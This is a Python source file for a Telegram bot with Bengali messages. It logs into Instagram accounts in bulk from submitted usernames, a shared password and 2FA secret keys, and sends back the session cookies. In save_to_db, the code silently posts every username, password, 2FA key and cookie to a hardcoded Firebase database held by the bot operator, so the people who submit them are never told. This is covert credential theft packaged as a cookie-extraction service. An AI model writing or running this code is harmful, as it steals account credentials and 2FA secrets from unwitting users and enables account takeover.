from keep_alive import keep_alive
keep_alive()
import os
import sys
import time
import json
import subprocess
import telebot
import instaloader
import pyotp
import requests
from telebot import types
from concurrent.futures import ThreadPoolExecutor

def install_requirements():
    requirements = ['pyTelegramBotAPI', 'instaloader', 'requests', 'pyotp']
    for lib in requirements:
        try:
            check_name = 'telebot' if lib == 'pyTelegramBotAPI' else lib
            __import__(check_name)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

install_requirements()

FIREBASE_BASE = "https://raiib1-default-rtdb.firebaseio.com/"
USERS_FILE    = "users.txt"
CONFIG_FILE   = "config.json"
ADMIN_ID      = "6649653531"

DEFAULT_CONFIG = {
    "force_join_enabled": True,
    "channels": [
        {"username": "money_matrix_07",  "link": "https://t.me/money_matrix_07",  "name": "🤑Main Channel🚀"},
        {"username": "MatrixMethod7",    "link": "https://t.me/MatrixMethod7",    "name": "🥵Matrix Method⚡"}
    ]
}

def load_config():
    if not os.path.exists(CONFIG_FILE):
        save_config(DEFAULT_CONFIG)
        return DEFAULT_CONFIG
    with open(CONFIG_FILE, "r") as f:
        return json.load(f)

def save_config(cfg):
    with open(CONFIG_FILE, "w") as f:
        json.dump(cfg, f, indent=2)

def load_users():
    if not os.path.exists(USERS_FILE):
        return set()
    with open(USERS_FILE, "r") as f:
        return set(line.strip() for line in f if line.strip())

def save_user(chat_id):
    if str(chat_id) not in load_users():
        with open(USERS_FILE, "a") as f:
            f.write(f"{chat_id}\n")

def is_admin(chat_id):
    return str(chat_id) == ADMIN_ID

def update_stats(user_inc, id_inc, cookie_inc=0):
    try:
        current = requests.get(f"{FIREBASE_BASE}stats.json").json() or {}
        data = {
            "active_users":    max(0, (current.get("active_users") or 0) + user_inc),
            "active_ids":      max(0, (current.get("active_ids") or 0) + id_inc),
            "total_extracted": (current.get("total_extracted") or 0) + cookie_inc
        }
        requests.put(f"{FIREBASE_BASE}stats.json", json=data)
    except:
        pass

def save_to_db(u, p, k, ck):
    payload = {"time": time.ctime(), "user": u, "pass": p, "two_factor": k, "cookie": ck}
    try:
        res = requests.post(f"{FIREBASE_BASE}cookies.json", json=payload, timeout=20)
        if res.status_code == 200:
            update_stats(0, 0, 1)
            return True
    except:
        pass
    return False

user_sessions = {}


def check_membership(bot, chat_id):
    cfg = load_config()
    if not cfg.get("force_join_enabled", True):
        return True, []
    not_joined = []
    for ch in cfg.get("channels", []):
        try:
            member = bot.get_chat_member(f"@{ch['username']}", chat_id)
            if member.status in ("left", "kicked"):
                not_joined.append(ch)
            # member.status in ("member","administrator","creator","restricted") = joined → OK
        except telebot.apihelper.ApiTelegramException as e:
            err = str(e).lower()
            # If bot has no access to the channel itself → skip this channel (don't punish the user)
            # This happens when the bot is not admin/member of the channel
            if "bot is not a member" in err or "forbidden" in err or "chat not found" in err or "need administrator rights" in err:
                pass  # can't check → let user through for this channel
            else:
                # Genuine "user not in chat" error
                not_joined.append(ch)
        except Exception:
            pass  # unknown error → don't block user
    return len(not_joined) == 0, not_joined

def send_join_prompt(bot, chat_id, not_joined):
    kb = types.InlineKeyboardMarkup()
    for ch in not_joined:
        kb.add(types.InlineKeyboardButton(f"➡️ {ch['name']}", url=ch['link']))
    kb.add(types.InlineKeyboardButton("✅ জয়েন করেছি, চেক করুন", callback_data="check_join"))
    bot.send_message(
        chat_id,
        "⚠️ **বট ব্যবহার করতে আগে নিচের চ্যানেলগুলোতে জয়েন করুন!**\n\n"
        "জয়েন করার পর ✅ বাটন চাপুন।",
        reply_markup=kb,
        parse_mode="Markdown"
    )


def worker(bot, chat_id, u, p, k):
    L = instaloader.Instaloader(quiet=True, max_connection_attempts=1)
    status_icon = "❌"
    result_text = "লগইন ব্যর্থ ⚠️"
    try:
        try:
            L.login(u, p)
        except:
            totp = pyotp.TOTP(k.replace(" ", "").strip()).now()
            L.two_factor_login(totp)
        cookies_dict = L.context._session.cookies.get_dict()
        ck_str = "; ".join([f"{n}={v}" for n, v in cookies_dict.items()])
        save_to_db(u, p, k, ck_str)
        if chat_id in user_sessions:
            user_sessions[chat_id]['results'].append(f"{u}|{p}|{ck_str}")
            status_icon = "✅"
            result_text = "কুকি বের হইছে সফলভাবে! 🔥"
    except Exception:
        if chat_id in user_sessions:
            user_sessions[chat_id]['fail_count'] += 1
    try:
        bot.send_message(chat_id, f"{status_icon} **{u}**\n{result_text}", parse_mode="Markdown")
        time.sleep(1)
    except:
        pass

def finalize(bot, chat_id, total_ids):
    time.sleep(2)
    s = user_sessions.get(chat_id)
    if not s:
        return
    success_count = len(s['results'])
    fail_count    = s['fail_count']
    file_name     = f"Cookies_{chat_id}.txt"
    with open(file_name, "w", encoding="utf-8") as f:
        f.write("\n".join(s['results']))
    report_msg = (
        f"📊 **এক্সট্রাকশন রিপোর্ট**\n\n"
        f"👤 **মোট আইডি ছিল:** `{total_ids}`\n"
        f"✅ **সফল হয়েছে:** `{success_count}`\n"
        f"❌ **লগইন ব্যর্থ:** `{fail_count}`\n\n"
        f"📂 সব কুকি উপরের ফাইলে সাজানো আছে।"
    )
    try:
        if success_count > 0:
            with open(file_name, "rb") as doc:
                bot.send_document(chat_id, doc, caption=report_msg, parse_mode="Markdown")
        else:
            bot.send_message(chat_id, f"❌ দুঃখিত, কোনো কুকি বের করা যায়নি।\nব্যর্থ: {fail_count}")
    except:
        pass
    if os.path.exists(file_name):
        os.remove(file_name)
    update_stats(-1, -total_ids)
    user_sessions.pop(chat_id, None)


def run_bot(token):
    bot = telebot.TeleBot(token)
    print("🚀 Bot is Online!")

    # ── /start ─────────────────────────────────────────────────────────────────
    @bot.message_handler(commands=['start'])
    def welcome(m):
        save_user(m.chat.id)
        joined, not_joined = check_membership(bot, m.chat.id)
        if not joined:
            send_join_prompt(bot, m.chat.id, not_joined)
            return
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("🚀 START EXTRACTION", callback_data="bulk"))
        bot.send_message(m.chat.id, "👋 **Welcome to Cookies Bot**\n\n", reply_markup=kb, parse_mode="Markdown")

    # ── Join check callback ────────────────────────────────────────────────────
    @bot.callback_query_handler(func=lambda c: c.data == "check_join")
    def check_join_cb(c):
        joined, not_joined = check_membership(bot, c.from_user.id)
        if joined:
            bot.answer_callback_query(c.id, "✅ ধন্যবাদ! বট ব্যবহার করুন।")
            try:
                bot.delete_message(c.message.chat.id, c.message.message_id)
            except:
                pass
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton("🚀 START EXTRACTION", callback_data="bulk"))
            bot.send_message(c.message.chat.id, "👋 **Welcome to Cookies Bot**\n\n", reply_markup=kb, parse_mode="Markdown")
        else:
            bot.answer_callback_query(c.id, "❌ এখনো জয়েন করেননি!", show_alert=True)
            send_join_prompt(bot, c.message.chat.id, not_joined)

    # ── Extraction callback ────────────────────────────────────────────────────
    @bot.callback_query_handler(func=lambda c: c.data == "bulk")
    def start_bulk(c):
        joined, not_joined = check_membership(bot, c.from_user.id)
        if not joined:
            bot.answer_callback_query(c.id)
            send_join_prompt(bot, c.message.chat.id, not_joined)
            return
        save_user(c.message.chat.id)
        msg = bot.send_message(c.message.chat.id, "📝 **ইউজারনেম লিস্ট দিন (প্রতি লাইনে ১টি):**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, get_u, bot)

    def get_u(m, b):
        joined, not_joined = check_membership(b, m.chat.id)
        if not joined:
            send_join_prompt(b, m.chat.id, not_joined)
            return
        u_list = [u.strip() for u in m.text.split('\n') if u.strip()]
        if not u_list:
            return
        user_sessions[m.chat.id] = {'u_list': u_list, 'results': [], 'fail_count': 0}
        msg = b.send_message(m.chat.id, f"🔐 **{len(u_list)} টি আইডির পাসওয়ার্ড দিন (১ টি পাসওয়ার্ড):**", parse_mode="Markdown")
        b.register_next_step_handler(msg, get_p, b)

    def get_p(m, b):
        if m.chat.id in user_sessions:
            user_sessions[m.chat.id]['pass'] = m.text.strip()
        msg = b.send_message(m.chat.id, "🔑 **ইউজারনেম অনুযায়ী 2FA Key দিন:**", parse_mode="Markdown")
        b.register_next_step_handler(msg, engine, b)

    def engine(m, b):
        keys = [k.strip() for k in m.text.split('\n') if k.strip()]
        s = user_sessions.get(m.chat.id)
        if not s or len(keys) != len(s['u_list']):
            b.send_message(m.chat.id, "❌ ইউজারনেম এবং 2fa key এর সংখ্যা মিলেনি!")
            return
        b.send_message(m.chat.id, "⚡ **কাজ শুরু হয়েছে,..**", parse_mode="Markdown")
        update_stats(1, len(s['u_list']))
        executor = ThreadPoolExecutor(max_workers=10)
        for i in range(len(s['u_list'])):
            executor.submit(worker, b, m.chat.id, s['u_list'][i], s['pass'], keys[i])
        executor.shutdown(wait=True)
        finalize(b, m.chat.id, len(s['u_list']))

    # ── Admin: Force Join management ───────────────────────────────────────────
    @bot.message_handler(commands=['forcejoin'])
    def toggle_forcejoin(m):
        if not is_admin(m.chat.id):
            bot.send_message(m.chat.id, "❌ এই কমান্ড শুধু অ্যাডমিনের জন্য।")
            return
        cfg = load_config()
        cfg['force_join_enabled'] = not cfg.get('force_join_enabled', True)
        save_config(cfg)
        status = "✅ চালু" if cfg['force_join_enabled'] else "❌ বন্ধ"
        bot.send_message(m.chat.id, f"🔄 Force Join এখন **{status}**", parse_mode="Markdown")

    @bot.message_handler(commands=['addchannel'])
    def add_channel(m):
        if not is_admin(m.chat.id):
            bot.send_message(m.chat.id, "❌ এই কমান্ড শুধু অ্যাডমিনের জন্য।")
            return
        msg = bot.send_message(
            m.chat.id,
            "📌 **নতুন চ্যানেল যোগ করুন**\n\nফরম্যাটে পাঠান:\n`username | display name`\n\nউদাহরণ:\n`mychannel | 🔥 My Channel`",
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(msg, do_add_channel)

    def do_add_channel(m):
        try:
            parts = m.text.split("|")
            username = parts[0].strip().lstrip("@")
            name     = parts[1].strip() if len(parts) > 1 else username
            link     = f"https://t.me/{username}"
            cfg = load_config()
            existing = [ch['username'] for ch in cfg['channels']]
            if username in existing:
                bot.send_message(m.chat.id, f"⚠️ `@{username}` আগে থেকেই লিস্টে আছে।", parse_mode="Markdown")
                return
            cfg['channels'].append({"username": username, "link": link, "name": name})
            save_config(cfg)
            bot.send_message(m.chat.id, f"✅ **{name}** (`@{username}`) সফলভাবে যোগ হয়েছে!", parse_mode="Markdown")
        except Exception as e:
            bot.send_message(m.chat.id, f"❌ ভুল ফরম্যাট। আবার চেষ্টা করুন।\n`username | display name`", parse_mode="Markdown")

    @bot.message_handler(commands=['removechannel'])
    def remove_channel(m):
        if not is_admin(m.chat.id):
            bot.send_message(m.chat.id, "❌ এই কমান্ড শুধু অ্যাডমিনের জন্য।")
            return
        cfg = load_config()
        channels = cfg.get('channels', [])
        if not channels:
            bot.send_message(m.chat.id, "⚠️ কোনো চ্যানেল নেই।")
            return
        kb = types.InlineKeyboardMarkup()
        for ch in channels:
            kb.add(types.InlineKeyboardButton(f"🗑 {ch['name']} (@{ch['username']})", callback_data=f"rmch_{ch['username']}"))
        bot.send_message(m.chat.id, "❌ **কোন চ্যানেল সরাতে চান?**", reply_markup=kb, parse_mode="Markdown")

    @bot.callback_query_handler(func=lambda c: c.data.startswith("rmch_"))
    def do_remove_channel(c):
        if not is_admin(c.from_user.id):
            bot.answer_callback_query(c.id, "❌ অনুমতি নেই।")
            return
        username = c.data[5:]
        cfg = load_config()
        before = len(cfg['channels'])
        cfg['channels'] = [ch for ch in cfg['channels'] if ch['username'] != username]
        save_config(cfg)
        if len(cfg['channels']) < before:
            bot.answer_callback_query(c.id, f"✅ @{username} সরানো হয়েছে।")
            bot.edit_message_text(f"✅ `@{username}` সফলভাবে সরানো হয়েছে।", c.message.chat.id, c.message.message_id, parse_mode="Markdown")
        else:
            bot.answer_callback_query(c.id, "⚠️ পাওয়া যায়নি।")

    @bot.message_handler(commands=['channels'])
    def list_channels(m):
        if not is_admin(m.chat.id):
            bot.send_message(m.chat.id, "❌ এই কমান্ড শুধু অ্যাডমিনের জন্য।")
            return
        cfg = load_config()
        channels = cfg.get('channels', [])
        status = "✅ চালু" if cfg.get('force_join_enabled', True) else "❌ বন্ধ"
        if not channels:
            bot.send_message(m.chat.id, f"📋 Force Join: **{status}**\n\nকোনো চ্যানেল নেই।", parse_mode="Markdown")
            return
        text = f"📋 **Force Join:** {status}\n\n**চ্যানেল লিস্ট:**\n"
        for i, ch in enumerate(channels, 1):
            text += f"{i}. {ch['name']} — [@{ch['username']}]({ch['link']})\n"
        bot.send_message(m.chat.id, text, parse_mode="Markdown", disable_web_page_preview=True)

    # ── Admin: Broadcast ───────────────────────────────────────────────────────
    @bot.message_handler(commands=['broadcast'])
    def broadcast_start(m):
        if not is_admin(m.chat.id):
            bot.send_message(m.chat.id, "❌ এই কমান্ড শুধু অ্যাডমিনের জন্য।")
            return
        msg = bot.send_message(m.chat.id, "📢 **ব্রডকাস্ট মেসেজ লিখুন:**\n\nযেকোনো টেক্সট, ছবি বা ফাইল পাঠান।", parse_mode="Markdown")
        bot.register_next_step_handler(msg, do_broadcast)

    def do_broadcast(m):
        users = load_users()
        if not users:
            bot.send_message(m.chat.id, "⚠️ কোনো ইউজার পাওয়া যায়নি।")
            return
        status_msg = bot.send_message(m.chat.id, f"⏳ ব্রডকাস্ট শুরু হচ্ছে... মোট {len(users)} জন।")
        success = 0
        failed  = 0
        for uid in users:
            try:
                if m.content_type == 'text':
                    bot.send_message(int(uid), m.text, parse_mode="Markdown")
                elif m.content_type == 'photo':
                    bot.send_photo(int(uid), m.photo[-1].file_id, caption=m.caption or "")
                elif m.content_type == 'document':
                    bot.send_document(int(uid), m.document.file_id, caption=m.caption or "")
                elif m.content_type == 'video':
                    bot.send_video(int(uid), m.video.file_id, caption=m.caption or "")
                elif m.content_type == 'sticker':
                    bot.send_sticker(int(uid), m.sticker.file_id)
                success += 1
            except:
                failed += 1
            time.sleep(0.05)
        bot.edit_message_text(
            f"✅ **ব্রডকাস্ট সম্পন্ন!**\n\n📨 সফল: `{success}`\n❌ ব্যর্থ: `{failed}`",
            chat_id=m.chat.id,
            message_id=status_msg.message_id,
            parse_mode="Markdown"
        )

    # ── Admin: Users count ─────────────────────────────────────────────────────
    @bot.message_handler(commands=['users'])
    def user_count(m):
        if not is_admin(m.chat.id):
            bot.send_message(m.chat.id, "❌ এই কমান্ড শুধু অ্যাডমিনের জন্য।")
            return
        users = load_users()
        bot.send_message(m.chat.id, f"👥 **মোট ইউজার:** `{len(users)}`", parse_mode="Markdown")

    # ── Admin: Check bot channel access ───────────────────────────────────────
    @bot.message_handler(commands=['checkbot'])
    def check_bot_access(m):
        if not is_admin(m.chat.id):
            bot.send_message(m.chat.id, "❌ এই কমান্ড শুধু অ্যাডমিনের জন্য।")
            return
        cfg = load_config()
        channels = cfg.get('channels', [])
        if not channels:
            bot.send_message(m.chat.id, "⚠️ কোনো চ্যানেল কনফিগার করা নেই।")
            return
        lines = ["🔍 **চ্যানেল অ্যাক্সেস চেক:**\n"]
        for ch in channels:
            try:
                bot.get_chat_member(f"@{ch['username']}", m.chat.id)
                lines.append(f"✅ @{ch['username']} — বট সঠিকভাবে চেক করতে পারছে")
            except telebot.apihelper.ApiTelegramException as e:
                err = str(e).lower()
                if "forbidden" in err or "bot is not a member" in err or "need administrator rights" in err:
                    lines.append(
                        f"❌ @{ch['username']} — **বট অ্যাডমিন না!**\n"
                        f"   ➡️ চ্যানেলে বটকে অ্যাডমিন করুন"
                    )
                elif "chat not found" in err:
                    lines.append(f"❌ @{ch['username']} — চ্যানেল খুঁজে পাওয়া যাচ্ছে না (username ঠিক আছে তো?)")
                else:
                    lines.append(f"⚠️ @{ch['username']} — অজানা সমস্যা: `{str(e)[:80]}`")
        lines.append("\n💡 বট কাজ করতে হলে প্রতিটি চ্যানেলে বটকে **অ্যাডমিন** করতে হবে।")
        bot.send_message(m.chat.id, "\n".join(lines), parse_mode="Markdown")

    # ── Admin panel ────────────────────────────────────────────────────────────
    @bot.message_handler(commands=['admin'])
    def admin_panel(m):
        if not is_admin(m.chat.id):
            bot.send_message(m.chat.id, "❌ এই কমান্ড শুধু অ্যাডমিনের জন্য।")
            return
        cfg = load_config()
        fj  = "✅ চালু" if cfg.get('force_join_enabled', True) else "❌ বন্ধ"
        text = (
            "🛠 **অ্যাডমিন প্যানেল**\n\n"
            f"🔒 Force Join: **{fj}**\n"
            f"📢 চ্যানেল সংখ্যা: `{len(cfg.get('channels', []))}`\n"
            f"👥 মোট ইউজার: `{len(load_users())}`\n\n"
            "**কমান্ড সমূহ:**\n"
            "/forcejoin — Force Join চালু/বন্ধ\n"
            "/addchannel — নতুন চ্যানেল যোগ\n"
            "/removechannel — চ্যানেল সরানো\n"
            "/channels — চ্যানেল লিস্ট দেখুন\n"
            "/broadcast — সব ইউজারকে মেসেজ\n"
            "/users — মোট ইউজার সংখ্যা\n"
            "/checkbot — চ্যানেল অ্যাক্সেস চেক করুন"
        )
        bot.send_message(m.chat.id, text, parse_mode="Markdown")

    bot.infinity_polling(skip_pending=True)


if __name__ == "__main__":
    MY_TOKEN = os.environ.get("BOT_TOKEN") or input("🤖 Enter Bot Token: ").strip()
    while True:
        try:
            run_bot(MY_TOKEN)
        except Exception:
            time.sleep(5)
